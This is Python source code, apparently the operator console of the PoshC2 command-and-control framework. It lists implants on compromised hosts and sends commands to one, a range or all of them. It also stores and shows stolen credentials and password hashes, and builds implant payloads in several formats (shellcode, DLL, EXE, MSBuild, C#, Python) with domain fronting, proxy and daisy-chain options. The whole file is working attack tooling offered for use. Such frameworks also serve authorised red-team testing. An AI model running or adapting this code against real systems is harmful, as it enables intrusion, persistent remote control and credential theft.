#!/usr/bin/env python3

import sys, os, time, subprocess, traceback, signal, argparse, re
from poshc2.client.Help import logopic, PRECOMMANDS, UXCOMMANDS, SHARPCOMMANDS, COMMANDS, pre_help
from poshc2.server.DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails
from poshc2.server.DB import get_newimplanturl, get_implantbyid, get_implants, new_c2_message, update_label
from poshc2.server.DB import get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
from poshc2.server.DB import drop_newtasks, get_implanttype, get_history, get_randomuri, get_hostdetails, get_creds, get_creds_for_user, insert_cred
from poshc2.Colours import Colours
from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, ModulesDirectory
from poshc2.server.Core import get_creds_from_params
from poshc2.client.reporting.HTML import generate_table, graphviz
from poshc2.server.Payloads import Payloads
from poshc2.Utils import validate_sleep_time, randomuri, parse_creds
from poshc2.client.implant_handlers.PyHandler import handle_py_command
from poshc2.client.implant_handlers.SharpHandler import handle_sharp_command
from poshc2.client.cli.CommandPromptCompleter import FirstWordFuzzyWordCompleter
from poshc2.client.implant_handlers.PSHandler import handle_ps_command
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from datetime import datetime, timedelta


def catch_exit(signum, frame):
    sys.exit(0)


def get_implant_type_prompt_prefix(implant_id):
    if "," in str(implant_id):
        return ""
    implant = get_hostdetails(implant_id)
    pivot = implant[15]
    pivot_original = pivot
    if pivot_original.startswith("PS"):
        pivot = "PS"
    elif pivot_original.startswith("C#"):
        pivot = "C#"
    elif pivot_original.startswith("Python"):
        pivot = "PY"
    if "Daisy" in pivot_original:
        pivot = pivot + ";D"
    if "Proxy" in pivot_original:
        pivot = pivot + ";P"
    return pivot


def startup(user, printhelp=""):
    session = PromptSession(history=FileHistory('%s/.top-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory())
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except Exception:
        print("cls")
        print(chr(27) + "[2J")
    print(Colours.GREEN)
    print(logopic)

    try:
        if user is not None:
            print("User: " +Colours.BLUE + "%s%s" % (user, Colours.GREEN))
            print("")
        ii = get_implants()
        if ii:
            for i in ii:
                ID = i[0]
                LastSeen = i[7]
                Hostname = i[3]
                Domain = i[11]
                DomainUser = i[2]
                Arch = i[10]
                PID = i[8]
                Pivot = i[15]
                Sleep = i[13].strip()
                Label = i[16]
                Pivot = get_implant_type_prompt_prefix(ID)
                LastSeenTime = datetime.strptime(LastSeen, "%d/%m/%Y %H:%M:%S")
                now = datetime.now()
                if(Sleep.endswith('s')):
                    sleep_int = int(Sleep[:-1])
                elif(Sleep.endswith('m')):
                    sleep_int = int(Sleep[:-1]) * 60
                elif(Sleep.endswith('h')):
                    sleep_int = int(Sleep[:-1]) * 60 * 60
                else:
                    print(Colours.RED)
                    print("Incorrect sleep format: %s" % Sleep)
                    print(Colours.GREEN)
                    continue
                nowMinus3Beacons = now - timedelta(seconds=(sleep_int * 3))
                nowMinus10Beacons = now - timedelta(seconds=(sleep_int * 10))
                sID = "[" + str(ID) + "]"
                if not Label:
                    sLabel = ""
                else:
                    sLabel = "[" + Label + "]"
                if nowMinus10Beacons > LastSeenTime:
                    print(Colours.RED + "%s%s: Seen:%s | PID:%s | %s | %s\\%s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot))
                elif nowMinus3Beacons > LastSeenTime:
                    print(Colours.YELLOW + "%s%s: Seen:%s | PID:%s | %s | %s\\%s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot))
                else:
                    print(Colours.GREEN + "%s%s: Seen:%s | PID:%s | %s | %s\\%s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot))
        else:
            now = datetime.now()
            print(Colours.RED + "No Implants as of: %s" % now.strftime("%d/%m/%Y %H:%M:%S"))

        if printhelp:
            print(printhelp)

        command = session.prompt("\nSelect ImplantID or ALL or Comma Separated List (Enter to refresh):: ", completer=FirstWordFuzzyWordCompleter(PRECOMMANDS, WORD=True))
        print("")

        command = command.strip()
        if (command == "") or (command == "back") or (command == "clear"):
            do_back(user, command)
        if command.startswith("output-to-html"):
            do_output_to_html(user, command)
        if command.startswith("generate-reports"):
            do_generate_reports(user, command)
        if command.startswith("message "):
            do_message(user, command)
        if command.startswith("show-urls") or command.startswith("list-urls"):
            do_show_urls(user, command)
        if command.startswith("add-autorun"):
            do_add_autorun(user, command)
        if command.startswith("list-autorun"):
            do_list_autoruns(user, command)
        if command.startswith("del-autorun"):
            do_del_autorun(user, command)
        if command.startswith("nuke-autorun"):
            do_nuke_autoruns(user, command)
        if (command == "automigrate-frompowershell") or (command == "am"):
            do_automigrate_frompowershell(user, command)
        if command.startswith("show-serverinfo"):
            do_show_serverinfo(user, command)
        if command.startswith("turnoff-notifications"):
            do_turnoff_notifications(user, command)
        if command.startswith("turnon-notifications"):
            do_turnon_notifications(user, command)
        if command.startswith("set-clockworksmsapikey"):
            do_set_clockworksmsapikey(user, command)
        if command.startswith("set-clockworksmsnumber"):
            do_set_clockworksmsnumber(user, command)
        if command.startswith("set-killdate"):
            do_set_killdate(user, command)
        if command.startswith("set-defaultbeacon"):
            do_set_defaultbeacon(user, command)
        if command.startswith("opsec"):
            do_opsec(user, command)
        if command.startswith("listmodules"):
           do_listmodules(user, command)
        if command.startswith('creds '):
            do_creds(user, command)
        if (command == "pwnself") or (command == "p"):
            do_pwnself(user, command)
        if command == "tasks":
            do_tasks(user, command)
        if command == "cleartasks":
            do_cleartasks(user, command)
        if command.startswith("quit"):
            do_quit(user, command)
        if command.startswith("createdaisypayload"):
            do_createdaisypayload(user, command)
        if command.startswith("createproxypayload"):
            do_createproxypayload(user, command)
        if command.startswith("createnewpayload"):
            do_createnewpayload(user, startup)
        if command == "help":
            do_help(user, command)
        if command == "history":
            do_history(user, command)
        if command.startswith("use "):
            do_use(user, command)
        commandloop(command, user)
    except KeyboardInterrupt:
        startup(user)
    except EOFError:
        new_c2_message("%s logged off." % user)
        sys.exit(0)
    except Exception as e:
        if 'unable to open database file' in str(e):
            startup(user)
        else:
            traceback.print_exc()
            print("Error: %s" % e)
            print("Currently no valid implants: sleeping for 10 seconds")
            time.sleep(10)
            startup(user)


def runcommand(command, randomuri, implant_id, user):

    if command == "creds":
        do_creds(user, command)

    elif command.startswith('label-implant'):
        do_label_implant(user, command, randomuri)
        return

    elif command.startswith('remove-label'):
        do_remove_label(user, command, randomuri)
        return

    implant_type = get_implanttype(randomuri)

    if implant_type.startswith("Python"):
        handle_py_command(command, user, randomuri, implant_id)

    elif implant_type.startswith("C#"):
        handle_sharp_command(command, user, randomuri, implant_id)

    else:
        handle_ps_command(command, user, randomuri, implant_id)


def commandloop(implant_id, user):
    while(True):
        try:
            style = Style.from_dict({
                '': '#80d130',
            })
            session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
            implant_id_orig = implant_id
            if ("-" in implant_id) or ("all" in implant_id) or ("," in implant_id):
                print(Colours.GREEN)                
                prompt_commands = COMMANDS
                command = session.prompt("%s> " % implant_id, completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
                if command == "back":
                    return
            else:
                hostname = get_hostdetails(implant_id)
                if not hostname:
                    startup(user, "Unrecognised implant id or command: %s" % implant_id)
                prompt_commands = COMMANDS
                if hostname[15] == 'Python':
                    prompt_commands = UXCOMMANDS
                if hostname[15] == 'C#':
                    prompt_commands = SHARPCOMMANDS
                print(Colours.GREEN)
                print("%s\\%s @ %s (PID:%s)" % (hostname[11], hostname[2], hostname[3], hostname[8]))
                command = session.prompt("%s %s> " % (get_implant_type_prompt_prefix(implant_id), implant_id), completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
                if command == "back":
                    return

            # if "all" run through all implants get_implants()
            if implant_id == "all":
                if command == "back":
                    return
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands seperately? (Y/n) ")                    
                implants_split = get_implants()
                if implants_split:
                    for implant_details in implants_split:
                        # if "\n" in command run each command individually or ask the question if thats what they want to do
                        if "\n" in allcommands:
                            if ri.lower() == "y" or ri == "":
                                commands = allcommands.split('\n')
                                for command in commands:
                                    runcommand(command, implant_details[1], implant_id_orig, user)                      
                            else:
                                runcommand(command, implant_details[1], implant_id_orig, user)
                        else: 
                            runcommand(command, implant_details[1], implant_id_orig, user)

            # if "seperated list" against single uri
            elif "," in implant_id:
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands seperately? (Y/n) ")                    
                implant_split = implant_id.split(",")
                for split_implant_id in implant_split:
                    implant_randomuri = get_randomuri(split_implant_id)
                    # if "\n" in command run each command individually or ask the question if thats what they want to do
                    if "\n" in allcommands:
                        if ri.lower() == "y" or ri == "":
                            commands = allcommands.split('\n')
                            for command in commands:
                                runcommand(command, implant_randomuri, implant_id_orig, user)                        
                        else:
                            runcommand(command, implant_randomuri, implant_id_orig, user)
                    else: 
                        runcommand(command, implant_randomuri, implant_id_orig, user)

            # if "range" against single uri
            elif "-" in implant_id:
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands seperately? (Y/n) ")
                implant_split = implant_id.split("-")
                for range_implant_id in range(int(implant_split[0]), int(implant_split[1]) + 1):
                    try:
                        implant_randomuri = get_randomuri(range_implant_id)
                        # if "\n" in command run each command individually or ask the question if thats what they want to do
                        if "\n" in allcommands:
                            if ri.lower() == "y" or ri == "":
                                commands = allcommands.split('\n')
                                for command in commands:
                                    runcommand(command, implant_randomuri, implant_id_orig, user)                        
                            else:
                                runcommand(command, implant_randomuri, implant_id_orig, user)
                        else: 
                            runcommand(command, implant_randomuri, implant_id_orig, user)
                    except Exception:
                        print("Unknown ImplantID")

            # else run against single uri
            else:
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands seperately? (Y/n) ")
                implant_randomuri = get_randomuri(implant_id)
                # if "\n" in command run each command individually or ask the question if thats what they want to do
                if "\n" in allcommands:
                    if ri.lower() == "y" or ri == "":
                        commands = allcommands.split('\n')
                        for command in commands:
                            runcommand(command, implant_randomuri, implant_id_orig, user)                        
                    else:
                        runcommand(command, implant_randomuri, implant_id_orig, user)
                else: 
                    runcommand(command, implant_randomuri, implant_id_orig, user)

        except KeyboardInterrupt:
            commandloop(implant_id_orig, user)
        except EOFError:
            new_c2_message("%s logged off." % user)
            sys.exit(0)
        except Exception as e:
            print(Colours.RED)
            print("Error running against the selected implant ID, ensure you have typed the correct information")
            print(Colours.GREEN)
            traceback.print_exc()
            print("Error: %s" % e)
            time.sleep(1)
            startup(user, user) # TODO
        finally:
            implant_id = implant_id_orig # TODO hacky


def do_back(user, command):
    # TODO recursive
    startup(user)


def do_clear(user, command):
    return do_back(user, command)


def do_output_to_html(user, command):
    # TODO recursive
    startup(user, "This command has been retired, please use generate-reports")


def do_generate_reports(user, command):
    generate_table("Tasks")
    generate_table("C2Server")
    generate_table("Creds")
    generate_table("Implants")
    graphviz()
    time.sleep(1)
    # TODO recursive
    startup(user)


def do_message(user, command):
    message = command[len("message "):]
    new_c2_message("Message from %s - %s" % (user, message))
    # TODO recursive
    startup(user)


def do_show_urls(user, command):
    urls = get_c2urls()
    urlformatted = "RandomID  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
    for i in urls:
        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4], i[5], i[6], i[7])
    # TODO recursive
    startup(user, urlformatted)


def do_add_autorun(user, command):
    if command == "add-autorun":
        startup(user, "Please specify a module to autorun")
    autorun = command.replace("add-autorun ", "")
    autorun = autorun.replace("add-autorun", "")
    add_autorun(autorun)
    # TODO recursive
    startup(user, "add-autorun: %s\r\n" % autorun)


def do_list_autoruns(user, command):
    autoruns = get_autorun()
    # TODO recursive
    startup(user, autoruns)


def do_del_autorun(user, command):
    autorun = command.replace("del-autorun ", "")
    del_autorun(autorun)
    # TODO recursive
    startup(user, "deleted autorun\r\n")


def do_nuke_autoruns(user, command):
    del_autoruns()
    # TODO recursive
    startup(user, "nuked autoruns\r\n")


def do_automigrate_frompowershell(user, command):
    # TODO recursive
    startup(user, "automigrate not currently implemented for the Python version of PoshC2\r\n")


def do_am(user, command):
    return do_automigrate_frompowershell(user, command)


def do_show_serverinfo(user, command):
    i = get_c2server_all()
    detailsformatted = "\nHostnameIP: %s\nEncKey: %s\nDomainFrontHeader: %s\nDefaultSleep: %s\nKillDate: %s\nHTTPResponse: %s\nFolderPath: %s\nServerPort: %s\nQuickCommand: %s\nDownloadURI: %s\nDefaultProxyURL: %s\nDefaultProxyUser: %s\nDefaultProxyPass: %s\nEnableSounds: %s\nAPIKEY: %s\nMobileNumber: %s\nURLS: %s\nSocksURLS: %s\nInsecure: %s\nUserAgent: %s\nReferer: %s\nAPIToken: %s\nAPIUser: %s\nEnableNotifications: %s\n" % (i[1], i[2], i[3], i[4], i[5], i[6], i[7], i[8], i[9], i[10], i[11], i[12], i[13], i[14], i[15], i[16], i[17], i[18], i[19], i[20], i[21], i[22], i[23], i[24])
    # TODO recursive
    startup(user, detailsformatted)


def do_turnoff_notifications(user, command):
    update_item("EnableNotifications", "C2Server", "No")
    # TODO recursive
    startup(user, "Turned off notifications on new implant")


def do_turnon_notifications(user, command):
    update_item("EnableNotifications", "C2Server", "Yes")
    # TODO recursive
    startup(user, "Turned on notifications on new implant")


def do_set_clockworksmsapikey(user, command):
    cmd = command.replace("set-clockworksmsapikey ", "")
    cmd = cmd.replace("set-clockworksmsapikey", "")
    update_item("ClockworkSMS_MobileNumbers", "C2Server", cmd)
    # TODO recursive
    startup(user, "Updated set-clockworksmsapikey: %s\r\n" % cmd)


def do_set_clockworksmsnumber(user, command):
    cmd = command.replace("set-clockworksmsnumber ", "")
    cmd = cmd.replace("set-clockworksmsnumber", "")
    update_item("ClockworkSMS_APIKEY", "C2Server", cmd)
    # TODO recursive
    startup(user, "Updated set-clockworksmsnumber (Restart C2 Server): %s\r\n" % cmd)


def do_set_killdate(user, command):
    cmd = command.replace("set-killdate ", "")
    cmd = cmd.replace("set-killdate", "")
    update_item("KillDate", "C2Server", cmd)
    # TODO recursive
    startup(user, "Updated KillDate (Remember to generate new payloads and get new implants): %s\r\n" % cmd)


def do_set_defaultbeacon(user, command):
    new_sleep = command.replace("set-defaultbeacon ", "")
    new_sleep = new_sleep.replace("set-defaultbeacon", "")
    if not validate_sleep_time(new_sleep):
        print(Colours.RED)
        print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
        print(Colours.GREEN)
        startup(user)
    else:
        update_item("DefaultSleep", "C2Server", new_sleep)
        # TODO recursive
        startup(user, "Updated set-defaultbeacon (Restart C2 Server): %s\r\n" % new_sleep)


def do_opsec(user, command):
    implants = get_implants_all()
    comtasks = get_tasks()
    hosts = ""
    uploads = ""
    urls = ""
    users = ""
    for i in implants:
        if i[3] not in hosts:
            hosts += "%s \n" % i[3]
        if i[9] not in urls:
            urls += "%s \n" % i[9]
    for t in comtasks:
        hostname = get_implantdetails(t[1])
        command = t[2].lower()
        output = t[3].lower()
        if hostname[2] not in users:
            users += "%s\\%s @ %s\n" % (hostname[11], hostname[2], hostname[3])
        if "invoke-pbind" in command and "connected" in output:
            tg = re.search("(?<=-target )\\S*", str(command))
            if tg[0] not in hosts:
                hosts += "%s \n" % tg[0]
        if "uploading file" in command:
            uploadedfile = command
            uploadedfile = uploadedfile.partition("uploading file: ")[2].strip()
            filehash = uploadedfile.partition(" with md5sum:")[2].strip()
            uploadedfile = uploadedfile.partition(" with md5sum:")[0].strip()
            uploadedfile = uploadedfile.strip('"')
            uploads += "%s\t%s\t%s\n" % (hostname[3], filehash, uploadedfile)
        if "installing persistence" in output:
            implant_details = get_implantdetails(t[2])
            line = command.replace('\n', '')
            line = line.replace('\r', '')
            filenameuploaded = line.rstrip().split(":", 1)[1]
            uploads += "%s %s \n" % (implant_details[3], filenameuploaded)
        if "written scf file" in output:
            implant_details = get_implantdetails(t[2])
            uploads += "%s %s\n" % (implant_details[3], output[output.indexof(':'):])
        creds, hashes = parse_creds(get_creds())
    # TODO recursive
    startup(user, "\nUsers Compromised: \n%s\nHosts Compromised: \n%s\nURLs: \n%s\nFiles Uploaded: \n%s\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (users, hosts, urls, uploads, creds, hashes))


def do_listmodules(user, command):
    mods = ""
    for modname in os.listdir(ModulesDirectory):
        mods += "%s\r\n" % modname
    # TODO recursive
    startup(user, mods)


def do_creds(user, command):
    if "-add " in command:
        p = re.compile(r"-domain=([^\s]*)")
        domain = re.search(p, command)
        if domain: domain = domain.group(1)
        p = re.compile(r"-username=([^\s]*)")
        username = re.search(p, command)
        if username: username = username.group(1)
        p = re.compile(r"-password=([^\s]*)")
        password = re.search(p, command)
        if password: password = password.group(1)
        p = re.compile(r"-hash=([^\s]*)")
        hash = re.search(p, command)
        if hash: hash = hash.group(1)
        if not domain or not username:
            startup(user, "Please specify a domain and username")
        if password and hash:
            startup(user, "Please specify a password or a hash, but not both")
        if not password and not hash:
            startup(user, "Please specify either a password or a hash")
        insert_cred(domain, username, password, hash)
        startup(user, "Credential added successfully")
    elif "-search " in command:
        username = command.replace("creds ", "")
        username = username.replace("-search ", "")
        username = username.strip()
        creds, hashes = parse_creds(get_creds_for_user(username))
        startup(user, "Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
    else:
        creds, hashes = parse_creds(get_creds())
        startup(user, "\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))


def do_pwnself(user, command):
    subprocess.Popen(["python2.7", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
    startup(user)


def do_p(user, command):
    return do_pwnself(user, command)


def do_tasks(user, command):
    alltasks = ""
    tasks = get_newtasks_all()
    if tasks is None:
        startup(user, "No tasks queued!\r\n")
    else:
        for task in tasks:
            imname = get_implantdetails(task[1])
            alltasks += "[%s] : %s | %s\r\n" % (imname[0], "%s\\%s" % (imname[11], imname[2]), task[2])
        startup(user, "Queued tasks:\r\n\r\n%s" % alltasks)


def do_cleartasks(user, command):
    drop_newtasks()
    startup(user, "Empty tasks queue\r\n")


def do_quit(user, command):
    ri = input("Are you sure you want to quit? (Y/n) ")
    if ri.lower() == "n":
        startup(user)
    if ri == "" or ri.lower() == "y":
        new_c2_message("%s logged off." % user)
        sys.exit(0)


def do_createdaisypayload(user, command):
    name = input(Colours.GREEN + "Daisy name: e.g. DC1 ")
    domain = input("Domain or URL: https://www.example.com ")
    daisyurl = input("Daisy host: .e.g. http://10.150.10.1 ")
    if (daisyurl == "http://127.0.0.1"):
        daisyurl = "http://localhost"
    if (daisyurl == "https://127.0.0.1"):
        daisyurl = "https://localhost"
    daisyport = input("Daisy port: .e.g. 8888 ")
    daisyhostid = input("Select Daisy Implant Host: e.g. 5 ")
    daisyhost = get_implantbyid(daisyhostid)
    proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
    C2 = get_c2server_all()
    newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "",
                          "", proxynone, C2[19], C2[20],
                          C2[21], "%s?d" % get_newimplanturl(), PayloadsDirectory)
    newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl + ":" + daisyport), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
    newPayload.CreateRaw(name)
    newPayload.CreateDlls(name)
    newPayload.CreateShellcode(name)
    newPayload.CreateEXE(name)
    newPayload.CreateMsbuild(name)
    newPayload.CreateCS(name)
    new_urldetails(name, C2[1], C2[3], domain, daisyurl, daisyhostid, "")
    startup(user, "Created new %s daisy payloads" % name)


def do_createnewpayload(user, command, creds=None):
    params = re.compile("createnewpayload ", re.IGNORECASE)
    params = params.sub("", command)
    creds = None
    if "-credid" in params:
        creds, params = get_creds_from_params(params, user)
        if creds is None:
            return
        if not creds['Password']:
            print(Colours.RED, "This command does not support credentials with hashes" ,Colours.GREEN)
    domain = input("Domain or URL: https://www.example.com ")
    domainbase = (domain.lower()).replace('https://', '')
    domainbase = domainbase.replace('http://', '')
    domainfront = input("Domain front URL: e.g. fjdsklfjdskl.cloudfront.net ")
    proxyurl = input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
    randomid = randomuri(5)
    proxyuser = ""
    proxypass = ""
    credsexpire = ""
    if proxyurl:
        if creds is not None:
            proxyuser = "%s\\%s" % (creds['Domain'], creds['Username'])
            proxypass = creds['Password']
        else:
            proxyuser = input(Colours.GREEN + "Proxy User: e.g. Domain\\user ")
            proxypass = input("Proxy Password: e.g. Password1 ")
        credsexpire = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018 ")
        imurl = "%s?p" % get_newimplanturl()
        domainbase = "Proxy%s%s" % (domainbase, randomid)
    else:
        domainbase = "%s%s" % (randomid, domainbase)
        imurl = get_newimplanturl()
    C2 = get_c2server_all()
    newPayload = Payloads(C2[5], C2[2], domain, domainfront, C2[8], proxyuser,
                          proxypass, proxyurl, "", "", C2[19], C2[20],
                          C2[21], imurl, PayloadsDirectory)
    newPayload.CreateRaw("%s_" % domainbase)
    newPayload.CreateDlls("%s_" % domainbase)
    newPayload.CreateShellcode("%s_" % domainbase)
    newPayload.CreateEXE("%s_" % domainbase)
    newPayload.CreateMsbuild("%s_" % domainbase)
    newPayload.CreatePython("%s_" % domainbase)
    newPayload.CreateCS("%s_" % domainbase)
    new_urldetails(randomid, domain, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
    startup(user, "Created new payloads")


def do_createproxypayload(user, command, creds=None):
    params = re.compile("createproxypayload ", re.IGNORECASE)
    params = params.sub("", command)
    creds = None
    if "-credid" in params:
        creds, params = get_creds_from_params(params, user)
        if creds is None:
            return
        if not creds['Password']:
            print(Colours.RED, "This command does not support credentials with hashes" ,Colours.GREEN)
    if creds is not None:
        proxyuser = "%s\\%s" % (creds['Domain'], creds['Username'])
        proxypass = creds['Password']
    else:
        proxyuser = input(Colours.GREEN + "Proxy User: e.g. Domain\\user ")
        proxypass = input("Proxy Password: e.g. Password1 ")
    proxyurl = input(Colours.GREEN + "Proxy URL: .e.g. http://10.150.10.1:8080 ")
    credsexpire = input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
    update_item("ProxyURL", "C2Server", proxyurl)
    update_item("ProxyUser", "C2Server", proxyuser)
    update_item("ProxyPass", "C2Server", proxypass)
    C2 = get_c2server_all()
    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                          C2[13], C2[11], "", "", C2[19], C2[20],
                          C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
    newPayload.CreateRaw("Proxy")
    newPayload.CreateDlls("Proxy")
    newPayload.CreateShellcode("Proxy")
    newPayload.CreateEXE("Proxy")
    newPayload.CreateMsbuild("Proxy")
    newPayload.CreateCS("Proxy")
    new_urldetails("Proxy", C2[1], C2[3], proxyurl, proxyuser, proxypass, credsexpire)
    startup(user, "Created new proxy payloads")


def do_help(user, command):
    startup(user, pre_help)


def do_history(user, command):
    startup(user, get_history())


def do_use(user, command):
    command = command.replace("use ", "")


def do_label_implant(user, command, randomuri):
    label = command.replace('label-implant', '').strip()
    update_label(label, randomuri)


def do_remove_label(user, command, randomuri):
     update_label("", randomuri)


def main(args):
    signal.signal(signal.SIGINT, catch_exit)
    parser = argparse.ArgumentParser(description='The command line for handling implants in PoshC2')
    parser.add_argument('-u', '--user', help='the user for this session')
    args = parser.parse_args(args)
    user = args.user
    while not user:
        print(Colours.GREEN + "A username is required for logging")
        user = input("Enter your username: ")
    new_c2_message("%s logged on." % user)
    startup(user)

if __name__ == '__main__':
    args = sys.argv
    main(args)    
